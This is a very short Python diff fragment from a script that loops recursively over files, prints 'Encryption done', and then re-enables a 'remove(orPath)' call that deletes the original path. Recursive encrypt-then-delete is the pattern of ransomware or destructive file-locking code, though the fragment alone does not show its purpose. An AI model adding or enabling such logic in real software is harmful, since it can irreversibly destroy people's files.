@@ -45,4 +45,4 @@ for filename in glob.iglob(path + '**/*', recursive=True):
         
     
 print('Encryption done')
-#remove(orPath)
+remove(orPath)
